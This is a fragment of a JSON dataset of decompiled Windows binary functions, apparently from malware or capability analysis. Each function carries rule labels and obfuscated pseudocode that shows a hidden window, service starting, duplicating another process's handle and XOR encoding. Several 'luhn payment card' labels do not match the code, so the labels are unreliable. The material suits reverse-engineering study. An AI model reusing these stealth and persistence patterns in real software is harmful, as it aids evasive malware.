        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404458) overlaps instruction at (ram,0x00404456)\n// \n\nvoid __fastcall fcn.00404310(uint param_1, uint param_2, uint32_t *param_3)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char cVar4;\n    ushort uVar5;\n    uint8_t uVar6;\n    uint16_t uVar7;\n    uint in_EAX;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    int32_t unaff_EBX;\n    uint *puVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t unaff_ESI;\n    uint8_t *unaff_EDI;\n    bool in_CF;\n    uint8_t in_AF;\n    bool bVar14;\n    bool bVar15;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 in_ST0;\n    float10 extraout_ST0;\n    ulong uVar16;\n    uint32_t uStack20;\n    ushort uStack16;\n    ushort uStack14;\n    ushort uStack12;\n    ushort uStack10;\n    ushort uStack8;\n    ushort uStack6;\n    \n    uVar16 = CONCAT44(param_2, in_EAX);\n    puVar10 = &stack0xfffffffc;\n    uStack8 = unaff_EBX;\n    uStack6 = unaff_EBX >> 0x10;\n    uStack12 = unaff_ESI;\n    uStack10 = unaff_ESI >> 0x10;\n    uStack16 = SUB42(unaff_EDI, 0);\n    uStack14 = unaff_EDI >> 0x10;\n    if ((in_CF) || (!in_CF)) {\n        *param_3 = 0x5c;\n    }\n    else {\n        uVar6 = in_EAX;\n        cVar4 = uVar6 - *unaff_EDI;\n        uStack20 = (in_NT & 1) * 0x4000 | SBORROW1(uVar6, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                   (in_TF & 1) * 0x100 | (cVar4 < '\\0') * 0x80 | (cVar4 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                   ((POPCOUNT(cVar4) & 1U) == 0) * 4 | uVar6 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                   (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        unaff_ESI = unaff_ESI - 1;\n        uVar16 = func_0x1018a2a0();\n        param_3 = unaff_EBX + 0x1c6084d;\n        in_ST0 = extraout_ST0;\n    }\n    uVar5 = uStack12;\n    uVar6 = uVar16 >> 8;\n    uVar9 = uVar16 >> 0x28;\n    bVar14 = (unaff_EBX >> 8 ^ 0x16 | uVar6) != uVar9;\n    *(param_3 + 1) = 0x4d;\n    puVar12 = &stack0xfffffffc;\n    if ((bVar14) && (puVar12 = &stack0xfffffffc,  !bVar14)) {\n        puVar13 = &uStack20;\n        puVar12 = &uStack20;\n        cVar4 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar10;\n            cVar4 = cVar4 + -1;\n        } while ('\\0' < cVar4);\n    }\n    *(param_3 + 2) = 0x12;\n    iVar2 = puVar12[2];\n    *(iVar2 + 3) = 0xe7;\n    uVar8 = uVar16 >> 0x20;\n    uVar7 = (CONCAT11(uVar6 - 0x2b, uVar16) ^ 0x3d) + 0x7c28 ^ CONCAT11(uVar9 | uVar8, uVar8);\n    *(iVar2 + 4) = 0x29;\n    if ((0x4001 < uVar7) && (uVar7 < 0x4002)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(iVar2 + 5) = 0x97;\n    bVar15 = unaff_EBX + 1 < 0;\n    bVar14 = unaff_EBX == -1;\n    *(iVar2 + 6) = 0x5e;\n    puVar13 = puVar12;\n    if ((!bVar14) && (bVar14)) {\n        puVar11 = &uStack20;\n        puVar13 = &uStack20;\n        cVar4 = '\\x10';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar12;\n            cVar4 = cVar4 + -1;\n        } while ('\\0' < cVar4);\n    }\n    *(iVar2 + 7) = 0xbf;\n    if ((bVar14 || SCARRY4(unaff_EBX, 1) != bVar15) || (!bVar14 && SCARRY4(unaff_EBX, 1) == bVar15)) {\n        *(iVar2 + 8) = 0xac;\n    }\n    else {\n        in_ST0 = in_ST0 - *(puVar13 + 0x47c692c9);\n        puVar1 = uVar16 + -0x899adaf + (uVar16 >> 0x20) * 2;\n        *puVar1 = *puVar1 | param_3 >> 8;\n        *param_3 = *param_3 >> 0x15;\n    }\n    *(iVar2 + 9) = 0x26;\n    *(iVar2 + 10) = 0xa3;\n    uStack6 = uStack8;\n    uStack8 = uStack12;\n    uStack12 = iVar2;\n    uStack10 = iVar2 >> 0x10;\n    bVar14 = uVar5 + -1 < '\\0';\n    iVar3 = puVar13[2];\n    *(iVar3 + 0xb) = 0x5d;\n    if ((!bVar14) && (bVar14)) {\n        *(iVar2 + 0x1c) = in_ST0;\n        unaff_ESI = unaff_ESI + 5;\n    }\n    *(iVar3 + 0xc) = 0xcd;\n    *(unaff_ESI | 0x5f) = 0xd;\n    return;\n}\n",
        "token_count": 1656
    },
    "00404470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404470(void)\n\n{\n    uint uVar1;\n    \n    if (*0x42241c == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x42241c = 1;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00404910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404910(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    float10 extraout_ST0;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n        iVar2 = iVar2 + 5;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 306
    },
    "004049a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004049a0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00404a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b4b) overlaps instruction at (ram,0x00404b46)\n// \n// WARNING: Removing unreachable block (ram,0x00404aba)\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404a40(uint *arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar9;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_2h;\n    \n    bVar9 = false;\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        uVar5 = arg_14h * 2;\n        do {\n            uVar6 = *(var_8h + arg_10h);\n            uVar4 = (uVar5 ^ 0x6dd) + 1;\n            bVar8 = (uVar5 & 0xffff0000 | uVar4 & 0xff | (uVar4 >> 8) + var_8h << 8) != arg_10h;\n            uVar2 = *(var_ch % arg_ch + arg_8h);\n            uVar5 = var_ch % arg_ch & 0xffffff00U | uVar2;\n            if ((!bVar8) || (bVar8)) {\n                uVar5 = (var_ch + -1) % arg_ch;\n                puVar7 = arg_8h;\n            }\n            else {\n                puVar7 = arg_8h + bVar9 * -2 + 1;\n                uVar1 = in(uVar5);\n                *arg_8h = uVar1;\n                if (&stack0xffffffe0 < 1) {\n                    (*(puVar7 + 0x5e))();\n                    return;\n                }\n            }\n            uVar6 = uVar6 ^ *(uVar5 + puVar7);\n            if ((uVar6 != 0) && (uVar6 == 0)) {\n                uVar5 = bVar9 * 0x400 | (in_IF & 1) * 0x200;\n                uVar3 = uVar5 | (in_TF & 1) * 0x100;\n                bVar9 = (uVar5 & 0x400) != 0;\n                in_IF = (uVar3 & 0x200) != 0;\n                in_TF = ((uVar3 | (uVar6 < '\\0') * 0x80) & 0x100) != 0;\n            }\n            var_10h._0_1_ = arg_14h * 2;\n            *(arg_18h + -1 + var_ch) = var_10h ^ uVar6;\n            *(var_ch + arg_18h) = var_10h ^ uVar2;\n            uVar5 = var_8h + 1;\n            var_ch = var_ch + 2;\n            var_8h = uVar5;\n        } while (uVar5 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 812
    },
    "00404b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b4b) overlaps instruction at (ram,0x00404b46)\n// \n// WARNING: Removing unreachable block (ram,0x00404aba)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00404b60(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint16_t uVar5;\n    int32_t extraout_ECX;\n    uint8_t extraout_DL;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint32_t unaff_ESI;\n    uint *puVar8;\n    int32_t unaff_EDI;\n    uchar in_CS;\n    bool bVar9;\n    char cVar10;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar11;\n    char cVar12;\n    uint32_t in_stack_0000000c;\n    int32_t in_stack_00000010;\n    int32_t in_stack_00000014;\n    uint uStack36;\n    \n    bVar11 = false;\n    uVar4 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    cVar12 = '\\0';\n    cVar10 = '\\0';\n    bVar9 = (extraout_DL & 0x66) == 0;\n    uStack36 = uVar4;\n    fcn.00401f50();\n    if ((!bVar9 && cVar12 == cVar10) && (bVar9 || cVar12 != cVar10)) {\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        do {\n            unaff_ESI = unaff_ESI + 1;\n            if (in_stack_00000010 <= unaff_ESI) {\n                return in_stack_00000010;\n            }\n            uVar7 = *(unaff_ESI + in_stack_0000000c);\n            uVar5 = (unaff_ESI ^ 0x6dd) + 1;\n            bVar9 = (unaff_ESI & 0xffff0000 | uVar5 & 0xff | (uVar5 >> 8) + unaff_ESI << 8) != in_stack_0000000c;\n            uVar1 = *(unaff_EDI % arg_ch + arg_8h);\n            uVar6 = unaff_EDI % arg_ch & 0xffffff00U | uVar1;\n            if ((!bVar9) || (bVar9)) {\n                uVar6 = (unaff_EDI + -1) % arg_ch;\n                puVar8 = arg_8h;\n            }\n            else {\n                puVar8 = arg_8h + bVar11 * -2 + 1;\n                uVar4 = in(uVar6);\n                *arg_8h = uVar4;\n                if (&stack0xffffffdc < 1) {\n                    iVar3 = (*(puVar8 + 0x5e))(in_CS);\n                    return iVar3;\n                }\n            }\n            uVar7 = uVar7 ^ *(uVar6 + puVar8);\n            if ((uVar7 != 0) && (uVar7 == 0)) {\n                uVar6 = bVar11 * 0x400 | (in_IF & 1) * 0x200;\n                uVar2 = uVar6 | (in_TF & 1) * 0x100;\n                bVar11 = (uVar6 & 0x400) != 0;\n                in_IF = (uVar2 & 0x200) != 0;\n                in_TF = ((uVar2 | (uVar7 < '\\0') * 0x80) & 0x100) != 0;\n            }\n            *(in_stack_00000014 + -1 + unaff_EDI) = uVar7 ^ 0x3f;\n            *(unaff_EDI + in_stack_00000014) = uVar1 ^ 0x3f;\n            unaff_EDI = unaff_EDI + 2;\n        } while( true );\n    }\n    iVar3 = fcn.00401ec0(uVar4, arg_8h, arg_ch);\n    uStack36 = 0x404bd5;\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    return iVar3;\n}\n",
        "token_count": 1006
    },
    "00404e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00404e40(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    ushort in_DX;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        if (in_OF) {\n            out(in_DX, in_EAX);\n            fcn.00401940(arg_18h, arg_1ch);\n            return 1;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = fcn.00404be0(0x7c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 359
    },
    "00404810": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040485e) overlaps instruction at (ram,0x0040485c)\n// \n// WARNING: Removing unreachable block (ram,0x00404886)\n// WARNING: Removing unreachable block (ram,0x00404890)\n\nint32_t fcn.00404810(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    int32_t iVar6;\n    ulong uVar7;\n    int32_t iStack8;\n    \n    iVar6 = 1;\n    uVar7 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(param_1, param_2, 0, 0xf003f, &iStack8);\n    iVar4 = uVar7;\n    if (iVar4 != 0) {\n        return 0;\n    }\n    iVar5 = iStack8;\n    if ((-1 < iVar4) && (-1 >= iVar4)) {\n        param_3 = 0x76;\n        puVar1 = unaff_EBX + -0x74afebab;\n        uVar2 = *puVar1;\n        cVar3 = *puVar1 - extraout_ECX;\n        *puVar1 = cVar3 - 1;\n        *(extraout_ECX + -0x75) = *(extraout_ECX + -0x75) + (uVar7 >> 0x20) + (uVar2 < extraout_ECX || cVar3 == '\\0');\n        iVar5 = extraout_ECX;\n        param_4 = uVar7 >> 0x20;\n        iVar6 = iVar4;\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(iVar5, param_3, 0, param_4);\n    if (iVar4 != 0) {\n        iVar6 = 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iStack8);\n    return iVar6;\n}\n",
        "token_count": 493
    },
    "004049e0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004049e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x4223fc, 0x42243c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 140
    },
    "00404ce0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404dea) overlaps instruction at (ram,0x00404de9)\n// \n\nuint __cdecl fcn.00404ce0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint extraout_ECX;\n    int32_t iVar3;\n    char extraout_DH;\n    uchar *arg_18h_00;\n    uint32_t unaff_EBX;\n    char *pcVar4;\n    int16_t iVar5;\n    uchar *puVar6;\n    uint *unaff_ESI;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint *unaff_EDI;\n    uint *puVar9;\n    bool bVar10;\n    ulong uVar11;\n    uint uVar12;\n    uint auStack39 [7];\n    int32_t var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    var_4h = fcn.00403db0(arg_18h, arg_1ch, 0x407054, 7);\n    iVar5 = *0x10 + -0x34;\n    bVar10 = var_4h == 0;\n    if (bVar10) {\n        return 0;\n    }\n    if (!bVar10) {\n        if (bVar10) {\n            *unaff_EDI = *unaff_ESI;\n            uVar7 = CONCAT11(0xdf, unaff_EBX);\n            pcVar4 = unaff_EBX & 0xffff0000 | uVar7;\n            puVar6 = 0xb9e181d0;\n            *pcVar4 = *pcVar4 + extraout_DH;\n            *0xffa85f4d = *0xffa85f4d >> 4 | *0xffa85f4d << 4;\n            unaff_EBX = unaff_EBX & 0xffff0000 | uVar7 & 0xffffff00 | unaff_EBX + extraout_DH;\n            puVar2 = unaff_EDI + 2;\n            unaff_EDI[1] = &stack0xffffffcc;\n            goto code_r0x00404d67;\n        }\n    }\n    iVar5 = 0;\n    puVar2 = auStack39;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\ncode_r0x00404d67:\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    *puVar2 = iVar5;\n    *(puVar2 + 2) = iVar5;\n    uVar7 = 0;\n    do {\n        uVar11 = (*pcVar1)();\n        arg_18h_00 = uVar11 >> 0x20;\n        puVar6[uVar7 - 0x24] = uVar11;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x20);\n    bVar10 = extraout_ECX >> 8 == '\\x06';\n    puVar2 = *(puVar6 + -4);\n    puVar8 = puVar6 + -0x24;\n    puVar9 = puVar2;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    if ((bVar10) || (!bVar10)) {\n        iVar3 = *(puVar6 + 0x10);\n        puVar2 = *(puVar6 + 0x14);\n        arg_18h_00 = puVar6 + -0x24;\n        uVar12 = 0x20;\n    }\n    else {\n        uVar12 = in(uVar11 >> 0x20);\n        *puVar9 = uVar12;\n        uVar12 = extraout_ECX;\n        if (&stack0xffffffcc < 1) {\n            *puVar8 = 0;\n            *puVar2 = *puVar2 + puVar2;\n            *(puVar2 + -0x46) = *(puVar2 + -0x46) + (uVar11 >> 0x28);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar7 = puVar2 ^ 0xdee0ed6d;\n    *(unaff_EBX + 0x8b50104d) = *(unaff_EBX + 0x8b50104d) ^ iVar3;\n    fcn.00401250(*(puVar6 + 9), *(puVar6 + 0xd), iVar3, uVar7 & 0xffff0000 | uVar7 + (uVar7 >> 8) * -0x31 + 0x8d, \n                 arg_18h_00, puVar6 + 1, uVar12);\n    fcn.00401940(*(puVar6 + 0x19), *(puVar6 + 0x1d));\n    return 1;\n}\n",
        "token_count": 1203
    }
}